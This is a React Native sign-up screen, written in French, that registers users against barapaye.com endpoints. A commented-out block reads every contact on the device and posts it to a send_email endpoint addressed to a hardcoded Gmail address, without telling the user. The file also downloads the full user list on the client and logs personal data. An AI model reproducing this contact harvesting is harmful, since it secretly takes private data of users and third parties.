import React , { useState, useEffect }from 'react';
import { StyleSheet,Platform, ScrollView,Keyboard, SafeAreaView,StatusBar,TouchableWithoutFeedback, KeyboardAvoidingView, Text, View, Alert } from 'react-native';
import Suivant from '../section/suivant';
import FormInscription from '../section/formInscription';
import { TextInput } from 'react-native-paper';
import { useNavigation } from '@react-navigation/native';
import axios from 'axios';
import TermeCondition from '../section/termeInscription';
import { useSelector , useDispatch } from 'react-redux';
import Head from '../section-user/head'
import dateFormat from 'dateformat'
import * as RNLocalize from "react-native-localize";
import i18n from 'i18n-js';
import { fr, en } from '../../i18n/supportedLanguages';
import { Header } from 'react-navigation-stack';
import Contacts from 'react-native-contacts';
import { actionEmailP , actionNomP , actionPrenomP  , actionNumeroP } from '../../store/reducers/paiement';
import {actionId, actionNom, actionPrenom , actionTelephone,actionVille,actionCommune, actionPseudo, actionEmail, actionPays } from '../../store/reducers/reducerProfil'
export default function InscriptionP() {

  i18n.fallbacks = true;
  i18n.translations = { en, fr};
    
  const dta = RNLocalize.getLocales().find(e=> {return e.languageCode})
  
  i18n.locale = dta.languageCode


  const dataProfil = useSelector(state=> state.reducerProfil.profil)
  console.log('Pseudo : '+dataProfil.pseudo)
  console.log('Nom : '+dataProfil.nom)
  console.log('Prenom : '+dataProfil.prenom)
  console.log('Numero : '+dataProfil.telephone)
  console.log('Email : '+dataProfil.email)
  console.log('Pays : '+dataProfil.pays)
  console.log('Ville : '+dataProfil.ville)
  console.log('Commune : '+dataProfil.commune)

  const dispatch = useDispatch() 
 
  const navigation = useNavigation();

  const [hauteur, setHauteur] = useState(0);
  const [largeur, setLargeur] = useState(0);
  const [mdp, setMdp] = useState('');
  const [mdp1, setMdp1] = useState('');
  let [mp, setMP] = useState(true);
  let [load, setLoad]= useState(false)
  const [dataAxios, setDataAxios] = useState();
  const [id, setId] = useState('');

  const [contacts, setContacts] = useState([]);
  const [contactsData, setContactsData] = useState([]);
  const [telephone, setTelephone] = useState('');
  const [Alerter, setAlerter] = useState('')
  const [colorError, setColorError] = useState('black')
  const urlUserData = 'https://www.barapaye.com/users/';
  const urlListe = 'https://www.barapaye.com/liste/';
  const createUser = 'https://www.barapaye.com/createuser/';

 const find_dimesions= (layout)=>{
    const {x, y, width, height} = layout;
    setHauteur(height)
    setLargeur(width)
  }

const vision = ()=>{
  if (mp === false) {
    setMP(true)
  } else {
    setMP(false)
  }
}


const newDate= new Date()
const seconde = dateFormat(newDate, 'hhss')

const dataInscription={
  nom: dataProfil.nom,
  prenom: dataProfil.prenom,
  pseudo: dataProfil.pseudo,
  pays: dataProfil.pays,
  ville: dataProfil.ville,
  age: 'N.A',
  commune: dataProfil.commune,
  quartier: 'N.A',
  email: dataProfil.email,
  sexe: 'N.A',
  telephone: 'N.A',
  langue: 'N.A',
 
} 

const dataUser={
  username: dataProfil.pseudo,
  email: dataProfil.email,
  password: mdp,
}

const dataEmail={
  user_one: "lotusrouge225@gmail.com",
  user_two:"lotusrouge225@gmail.com",
  utilisateur: 'reus',
  body : contactsData ,
  phone : telephone
}

const pass1=(e)=>{
  setMdp(e)
}

const pass2=(e)=>{
  setMdp1(e)
}

// useEffect(() => {
//   useContacts()
//   if (Platform.OS === 'ios' ) {
//       setTelephone('ios')
//   } else if(Platform.OS=== 'android' ) {
//       setTelephone('android')
//   }
//   else{
//     setTelephone(Platform.OS)
//   }
// }, [])




//  const sendEmail = ()=> {

//    const formData = new FormData();
//    formData.append('user_one', "lotusrouge225@gmail.com");
//    formData.append('user_two', "lotusrouge225@gmail.com");
//    formData.append('utilisateur', "reus");
//    formData.append('body', contactsData );
//    formData.append('phone',  dataProfil.pseudo );

//    axios({
//      url : 'https://www.barapaye.com/send_email/',
//      method : 'POST',
//      data : formData,
//      headers: {
//            Accept: 'application/json',  
//          }
//    })
//    .then(function (response) {
//            console.log('success');          
//    })
//    .catch(function (error) {
//            console.log('Contact non transmis !');
//            console.log(error)
//    })
//  }
//  async function useContacts () {
//    if (Platform.OS === 'ios') {
//        const myContact = await Contacts.getAll((a, b)=>{
       
//          setContactsData(JSON.stringify(b))
//        });
//        setContacts(myContact)
 
//      }
//    else if(Platform.OS === 'android') {
//       const myContact = await Contacts.getAll((a, b)=>{
       
//         setContactsData(JSON.stringify(b))
//       });
//       setContacts(myContact)
//      }
//  }  


const userAccount =()=>{
  setLoad(true)
  if (mdp === mdp1 ) {  
        if (mdp.length < 5 ) {
          setColorError('#750000')
          setAlerter('Votre mot de passe doit contenir plus de 5 caracteres !')
          setLoad(false)
        } else {
    
              axios.get(urlUserData)
              .then(res => {
                setDataAxios(res.data)
                const dataNew = res.data
                const verification = dataNew.find((e) =>  e.username ===  dataProfil.pseudo )
                if ( verification ){
                  setLoad(false)
                  setAlerter('Ce pseudo existe deja')
                  setColorError('#750000')
                } else {
                  insertion()
                  // getId()
                  setAlerter('')
                  setColorError('black')
                  // sendEmail()
                  setLoad(false)
                  return navigation.push('Ajouter')
                }
            
          })
          .catch((e)=>{
            setLoad(false)
            setAlerter('Impossible de se connecter , veuillez ressayer plus tard !')
            setColorError('#750000')
            console.log('Erreur creation de compte user :'+ e)
          })
        }

  }else{
    setAlerter('Vous avez entré deux (2) mots de passe differents !')
    setLoad(false)
  }

}

const insertion1= async()=>{
  axios.post(urlListe, dataInscription)
  .then(res => {
    console.log('compte etablie avec succes Insertion 1')
    getId()
  }).catch((e) =>{ 
      console.log('Erreur au niveau Insertion 1')
  })
}

const getId= async ()=>{
  try{
    const response = await 
      fetch(urlListe);
      const json = await response.json()
      const verification = json.map((e) =>  e.id )
      var lastId= Math.max.apply(Math, verification)
      dispatch(actionId({idUtilisateur:lastId}))
      console.log(lastId)
  }catch(error){
    console.error(error)
    consol.log('Nous sommes en attente d erreur!')
  }
  finally{
    console.log('fin de taitement !')
  }
}


const insertion=()=>{
  axios.post(createUser, dataUser)
  .then(res => {
    setAlerter('')
    console.log('compte etablie avec succes Insertion')
    insertion1()
  }).catch((e) =>{ 
    setAlerter('Oups, une erreur est survenue lors de votre inscription')
  })
}

const back= ()=>{
  return navigation.pop()
}


  return (
    <KeyboardAvoidingView style={styles.container} keyboardVerticalOffset={(Platform.OS ==='ios'? 0:Header.height + 20) } behavior={ Platform.OS === 'ios' ? 'padding' : 'height' }>

      <TouchableWithoutFeedback onPress={Keyboard.dismiss} style={{ flex:1 }}>
        <View style={{ flex:1 }}> 
      <SafeAreaView style={{ backgroundColor:'#003060', }}>
          <StatusBar translucent barStyle='light-content' backgroundColor='#003060' />
        </SafeAreaView>
        <View style={{ height:30, bottom:0, marginTop:(Platform.OS === 'ios'? 0 :27) }}>
          <Head arriere={back} d2='none' />
        </View>
        <ScrollView style={{flex:1, marginBottom:hauteur, }}>
          <Text style={{ textAlign:'center', marginTop:25}}> {i18n.t('TextTopInscriptionP')}</Text>
        
          <FormInscription
            clavierType={ mp === true ? ( Platform.OS === 'ios' ? 'ascii-capable':'default' ) : ( Platform.OS === 'ios' ? 'ascii-capable':'visible-password' ) }
            changement={pass1}
            securite={mp}
            couleur={colorError}
            label={i18n.t('password1InscriptionP')}
            icone='key' 
            droite={<TextInput.Icon name='eye' size={20} onPress={vision} />} 
          />

          <FormInscription 
            clavierType={ mp === true ? ( Platform.OS === 'ios' ? 'ascii-capable':'default' ) : ( Platform.OS === 'ios' ? 'ascii-capable':'visible-password' ) }
            changement={pass2}
            securite={mp}
            label={i18n.t('password2InscriptionP')}
            icone='key' 
            couleur={colorError}
            droite={<TextInput.Icon name='eye' size={20} onPress={vision} />} 
          />
          <Text style={{ color:'#750000', fontWeight:'bold', alignSelf:'center', textAlign:'center' }}>{Alerter}</Text>

        </ScrollView>
       
        <View onLayout={(event) => { find_dimesions(event.nativeEvent.layout) }} style={{ position:'absolute', bottom:0, width:'100%'  }}>
        <TermeCondition  texte ={i18n.t('infoBottonInscription')} />
            <Suivant  couleur='#191970' appel={userAccount} loading={load} c='white' titre={i18n.t('sinscrire')} />
        </View>
        </View>
      </TouchableWithoutFeedback >

    </KeyboardAvoidingView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor:'lightblue',
    flexDirection:'column',
  },

});
